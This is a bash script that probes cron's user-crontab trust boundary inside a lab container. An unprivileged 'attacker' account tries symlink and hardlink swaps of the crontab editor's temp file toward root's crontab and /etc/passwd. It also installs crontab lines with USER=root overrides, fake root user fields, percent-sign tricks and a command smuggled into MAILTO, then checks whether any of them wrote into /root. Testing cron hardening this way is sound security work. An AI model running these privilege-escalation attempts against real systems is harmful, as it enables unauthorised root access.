#!/usr/bin/env bash
set -Eeuo pipefail

TARGET="${1:-${TARGET:-ubuntu24-server-lpe-target}}"
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
WORKSPACE="$(cd -- "$SCRIPT_DIR/.." && pwd)"
LOG="$WORKSPACE/logs/cron-user-crontab-semantics.out"
TAG="${TAG:-CRONUCT_$(date -u +%Y%m%d%H%M%S)_$$}"

if [ ! -d "$WORKSPACE/logs" ]; then
  echo "missing logs directory: $WORKSPACE/logs" >&2
  exit 1
fi

: > "$LOG"
exec > >(tee -a "$LOG") 2>&1

echo "cron user crontab semantics trust-boundary probe"
echo "target=$TARGET"
echo "tag=$TAG"
date -u '+utc_start=%Y-%m-%dT%H:%M:%SZ'

docker exec -i -e TAG="$TAG" "$TARGET" bash <<'TARGET_SCRIPT'
set -Eeuo pipefail
export LC_ALL=C

TAG="${TAG:?missing TAG}"
BASE="/home/attacker/${TAG}"
WORK="/tmp/${TAG}_work"
ROOT_PROOF="/root/${TAG}_attacker_rootproof"
ROOT_ENV="/tmp/${TAG}_root_env"
ROOT_ID="/tmp/${TAG}_root_id"
HAD_ATTACKER=0
HAD_ROOT=0
START_UTC="$(date -u '+%Y-%m-%d %H:%M:%S')"

section() {
  printf '\n## %s\n' "$1"
}

show_path() {
  local p
  for p in "$@"; do
    if [ -e "$p" ] || [ -L "$p" ]; then
      stat -Lc 'follow %n %F mode=%a owner=%U group=%G uid=%u gid=%g nlink=%h size=%s' "$p" 2>&1 || true
      stat -c 'nofollow %n %F mode=%a owner=%U group=%G uid=%u gid=%g nlink=%h size=%s -> %N' "$p" 2>&1 || true
      if [ -f "$p" ] && [ ! -L "$p" ] && [ "$(stat -c %s "$p" 2>/dev/null || echo 999999)" -le 4096 ] && grep -Iq . "$p"; then
        sed -n '1,20p' "$p" | sed "s#^#content $p: #"
      fi
    else
      printf 'missing %s\n' "$p"
    fi
  done
}

wait_next_cron_tick() {
  local now wait
  now="$(date +%S)"
  now=$((10#$now))
  wait=$((75 - now))
  if [ "$wait" -lt 20 ]; then
    wait=$((wait + 60))
  fi
  printf 'waiting_for_cron_tick_seconds=%s\n' "$wait"
  sleep "$wait"
}

save_crontabs() {
  mkdir -p "$WORK"
  if runuser -u attacker -- crontab -l >"$WORK/attacker.before" 2>"$WORK/attacker.before.err"; then
    HAD_ATTACKER=1
  fi
  if crontab -u root -l >"$WORK/root.before" 2>"$WORK/root.before.err"; then
    HAD_ROOT=1
  fi
  printf 'had_attacker_crontab=%s\n' "$HAD_ATTACKER"
  sed -n '1,20p' "$WORK/attacker.before.err" 2>/dev/null || true
  printf 'had_root_crontab=%s\n' "$HAD_ROOT"
  sed -n '1,20p' "$WORK/root.before.err" 2>/dev/null || true
}

restore_crontabs() {
  set +e
  if [ "$HAD_ATTACKER" = 1 ]; then
    runuser -u attacker -- crontab "$WORK/attacker.before" >/dev/null 2>&1
  else
    runuser -u attacker -- crontab -r >/dev/null 2>&1
  fi
  if [ "$HAD_ROOT" = 1 ]; then
    crontab -u root "$WORK/root.before" >/dev/null 2>&1
  else
    crontab -u root -r >/dev/null 2>&1
  fi
}

cleanup() {
  set +e
  restore_crontabs
  rm -rf "$BASE" "$WORK"
  rm -f /tmp/"${TAG}"* /var/tmp/"${TAG}"*
  rm -f "$ROOT_PROOF"
}
trap cleanup EXIT INT TERM

rm -rf "$BASE" "$WORK"
rm -f /tmp/"${TAG}"* /var/tmp/"${TAG}"* "$ROOT_PROOF"
install -d -o attacker -g attacker -m 0755 "$BASE"
save_crontabs

section "default package and service state before tests"
cat /etc/os-release | sed -n '1,12p'
uname -a
getent passwd 1001 || true
id attacker
id -nG attacker
getent group crontab mail || true
for p in cron cron-daemon-common systemd passwd login libpam-modules anacron at bsd-mailx mailutils postfix exim4-daemon-light nullmailer msmtp-mta; do
  dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' "$p" 2>/dev/null || printf '%s\tNOT_INSTALLED\n' "$p"
done | sort
printf 'cron_enabled='
systemctl is-enabled cron.service || true
printf 'cron_active='
systemctl is-active cron.service || true
systemctl status cron.service --no-pager -l | sed -n '1,14p' || true
systemctl cat cron.service 2>/dev/null | sed -n '1,80p' || true
ps -ef | grep -E '[c]ron' || true
printf 'system_state='
systemctl is-system-running || true

section "default helper, spool, mail, and parser policy state"
for p in /usr/sbin/cron /usr/bin/crontab /etc/crontab /etc/default/cron /etc/pam.d/cron /var/spool/cron /var/spool/cron/crontabs /usr/sbin/sendmail /usr/lib/sendmail /usr/bin/mail /usr/bin/mailx /var/mail /var/spool/mail; do
  show_path "$p"
done
sed -n '1,120p' /etc/crontab
sed -n '1,120p' /etc/default/cron 2>/dev/null || true
sed -n '1,120p' /etc/pam.d/cron
sysctl fs.protected_symlinks fs.protected_hardlinks fs.protected_regular fs.protected_fifos 2>/dev/null || true

section "uid1001 direct spool traversal and setgid editor boundary"
runuser -u attacker -- bash -s <<ATTACKER_DIRECT
set +e
echo "attacker_id=\$(id)"
echo "attacker_groups=\$(id -nG)"
for cmd in \
  "ls -la /var/spool/cron/crontabs" \
  "cat /var/spool/cron/crontabs/attacker" \
  "touch /var/spool/cron/crontabs/root" \
  "ln -s /etc/passwd /var/spool/cron/crontabs/${TAG}_link" \
  "ln /etc/passwd /var/spool/cron/crontabs/${TAG}_hard"; do
  printf '\$ %s\n' "\$cmd"
  bash -lc "\$cmd" 2>&1
  printf 'rc=%s\n' "\$?"
done
ATTACKER_DIRECT

cat >"$BASE/editor_id.sh" <<EDITOR_ID
#!/bin/sh
{
  id
  awk '/^(Uid|Gid|Groups|NoNewPrivs):/ {print}' /proc/\$\$/status
  stat -Lc 'editor-temp %n %F mode=%a owner=%U group=%G uid=%u gid=%g nlink=%h size=%s' "\$1"
} > /tmp/${TAG}_editor_id.out 2>&1
exit 1
EDITOR_ID
chown attacker:attacker "$BASE/editor_id.sh"
chmod 755 "$BASE/editor_id.sh"
runuser -u attacker -- env VISUAL="$BASE/editor_id.sh" EDITOR="$BASE/editor_id.sh" crontab -e >/tmp/"${TAG}"_editor_id.stdout 2>/tmp/"${TAG}"_editor_id.stderr || true
show_path /tmp/"${TAG}"_editor_id.stdout /tmp/"${TAG}"_editor_id.stderr /tmp/"${TAG}"_editor_id.out

section "setgid helper temp symlink and hardlink replacement checks"
cat >"$BASE/editor_symlink_root.sh" <<EDITOR_SYMLINK
#!/bin/sh
{
  id
  stat -Lc 'before %n %F mode=%a owner=%U group=%G uid=%u gid=%g nlink=%h size=%s' "\$1"
  rm -f -- "\$1"
  ln -s /var/spool/cron/crontabs/root "\$1"
  ls -l "\$1"
  stat -Lc 'after-follow %n %F mode=%a owner=%U group=%G uid=%u gid=%g nlink=%h size=%s' "\$1" 2>&1 || true
} > /tmp/${TAG}_editor_symlink_root.out 2>&1
exit 0
EDITOR_SYMLINK
chown attacker:attacker "$BASE/editor_symlink_root.sh"
chmod 755 "$BASE/editor_symlink_root.sh"
runuser -u attacker -- env VISUAL="$BASE/editor_symlink_root.sh" EDITOR="$BASE/editor_symlink_root.sh" crontab -e >/tmp/"${TAG}"_editor_symlink.stdout 2>/tmp/"${TAG}"_editor_symlink.stderr || true
show_path /tmp/"${TAG}"_editor_symlink.stdout /tmp/"${TAG}"_editor_symlink.stderr /tmp/"${TAG}"_editor_symlink_root.out /var/spool/cron/crontabs/root

cat >"$BASE/editor_hardlink.sh" <<EDITOR_HARDLINK
#!/bin/sh
{
  id
  stat -Lc 'before %n %F mode=%a owner=%U group=%G uid=%u gid=%g nlink=%h size=%s' "\$1"
  ln "\$1" "$BASE/temp_hardlink_to_crontab"
  stat -Lc 'after-link-temp %n %F mode=%a owner=%U group=%G uid=%u gid=%g nlink=%h size=%s' "\$1"
  stat -Lc 'after-link-copy %n %F mode=%a owner=%U group=%G uid=%u gid=%g nlink=%h size=%s' "$BASE/temp_hardlink_to_crontab"
  printf '* * * * * id > /tmp/${TAG}_hardlink_job_id\n' > "\$1"
} > /tmp/${TAG}_editor_hardlink.out 2>&1
exit 0
EDITOR_HARDLINK
chown attacker:attacker "$BASE/editor_hardlink.sh"
chmod 755 "$BASE/editor_hardlink.sh"
runuser -u attacker -- env VISUAL="$BASE/editor_hardlink.sh" EDITOR="$BASE/editor_hardlink.sh" crontab -e >/tmp/"${TAG}"_editor_hardlink.stdout 2>/tmp/"${TAG}"_editor_hardlink.stderr || true
show_path /tmp/"${TAG}"_editor_hardlink.stdout /tmp/"${TAG}"_editor_hardlink.stderr /tmp/"${TAG}"_editor_hardlink.out "$BASE/temp_hardlink_to_crontab" /var/spool/cron/crontabs/attacker
runuser -u attacker -- crontab -r >/dev/null 2>&1 || true

section "install attacker parser semantics crontab and controlled root canary"
install -d -o attacker -g attacker -m 0755 "$BASE/bin"
cat >"$BASE/bin/user_in_path_marker" <<'MARKER'
#!/bin/sh
echo attacker-path-marker
MARKER
chown -R attacker:attacker "$BASE/bin"
chmod 755 "$BASE/bin/user_in_path_marker"

cat >"$BASE/attacker_parser.cron" <<ATTACKER_CRON
SHELL=/bin/sh
PATH=$BASE/bin:/usr/bin:/bin
ATTACKER_SENTINEL=${TAG}
USER=root
LOGNAME=root
MAILTO=root
* * * * * id > /tmp/${TAG}_user_id; env | sort > /tmp/${TAG}_user_env; echo tick >> /tmp/${TAG}_reload_counter
* * * * * root id > /tmp/${TAG}_user_field_stdout 2>/tmp/${TAG}_user_field_stderr
* * * * * /bin/sh -c 'id > /tmp/${TAG}_percent_id; cat > /tmp/${TAG}_percent_stdin' %root /bin/id > /root/${TAG}_percent_fake_root
* * * * * /bin/sh -c 'id; echo attacker-write > /root/${TAG}_attacker_rootproof' > /tmp/${TAG}_rootwrite_stdout 2>/tmp/${TAG}_rootwrite_stderr
MAILTO=root;touch /tmp/${TAG}_mailto_shell
* * * * * echo ${TAG}_MAIL_OUTPUT; id > /tmp/${TAG}_unsafe_mail_job_id
* * * * * root /bin/sh -c 'id > /tmp/${TAG}_newline_fake_root' 2>/tmp/${TAG}_newline_fake_root_err
ATTACKER_CRON
chown attacker:attacker "$BASE/attacker_parser.cron"
runuser -u attacker -- crontab "$BASE/attacker_parser.cron"
runuser -u attacker -- crontab -l

cat >"$WORK/root_canary.cron" <<ROOT_CRON
SHELL=/bin/sh
* * * * * id > $ROOT_ID; env | sort > $ROOT_ENV; command -v user_in_path_marker > /tmp/${TAG}_root_path_lookup 2>&1 || true
ROOT_CRON
crontab -u root "$WORK/root_canary.cron"
crontab -u root -l

wait_next_cron_tick

section "parser, percent, user-field, mail, and root-canary results after first tick"
for p in \
  /tmp/"${TAG}"_user_id \
  /tmp/"${TAG}"_user_env \
  /tmp/"${TAG}"_reload_counter \
  /tmp/"${TAG}"_user_field_stdout \
  /tmp/"${TAG}"_user_field_stderr \
  /tmp/"${TAG}"_percent_id \
  /tmp/"${TAG}"_percent_stdin \
  /tmp/"${TAG}"_rootwrite_stdout \
  /tmp/"${TAG}"_rootwrite_stderr \
  /tmp/"${TAG}"_unsafe_mail_job_id \
  /tmp/"${TAG}"_mailto_shell \
  /tmp/"${TAG}"_newline_fake_root \
  /tmp/"${TAG}"_newline_fake_root_err \
  "$ROOT_ID" "$ROOT_ENV" /tmp/"${TAG}"_root_path_lookup "$ROOT_PROOF"; do
  show_path "$p"
done
printf '\n-- root canary env leakage grep --\n'
grep -E "ATTACKER_SENTINEL|$BASE|user_in_path_marker|^PATH=|^USER=|^LOGNAME=|^HOME=|^SHELL=" "$ROOT_ENV" 2>/dev/null || true
printf '\n-- attacker env grep --\n'
grep -E "ATTACKER_SENTINEL|$BASE|^PATH=|^USER=|^LOGNAME=|^HOME=|^SHELL=|^MAILTO=" /tmp/"${TAG}"_user_env 2>/dev/null || true
printf '\n-- cron journal since probe start --\n'
journalctl -u cron.service --since "$START_UTC" --no-pager -o short-iso | grep "$TAG\\|UNSAFE MAIL\\|No MTA installed\\|CMD" | tail -n 120 || true

section "daemon reload removal behavior"
before_remove_count="$(if [ -f /tmp/"${TAG}"_reload_counter ]; then wc -l </tmp/"${TAG}"_reload_counter; else echo 0; fi)"
printf 'reload_counter_before_remove=%s\n' "$before_remove_count"
runuser -u attacker -- crontab -r
if [ "$HAD_ROOT" = 1 ]; then
  crontab -u root "$WORK/root.before"
else
  crontab -u root -r >/dev/null 2>&1 || true
fi
wait_next_cron_tick
after_remove_count="$(if [ -f /tmp/"${TAG}"_reload_counter ]; then wc -l </tmp/"${TAG}"_reload_counter; else echo 0; fi)"
printf 'reload_counter_after_remove=%s\n' "$after_remove_count"
if [ "$before_remove_count" = "$after_remove_count" ]; then
  echo "reload_remove_result=stopped_after_crontab_r"
else
  echo "reload_remove_result=still_running_after_crontab_r"
fi
journalctl -u cron.service --since "$START_UTC" --no-pager -o short-iso | grep "$TAG\\|RELOAD\\|CMD" | tail -n 160 || true

section "root proof and health"
if [ -e "$ROOT_PROOF" ]; then
  echo "ROOT_PROOF=YES"
  show_path "$ROOT_PROOF"
else
  echo "ROOT_PROOF=NO"
fi
systemctl is-active cron.service || true
systemctl is-system-running || true
systemctl --failed --no-legend || true

TARGET_SCRIPT
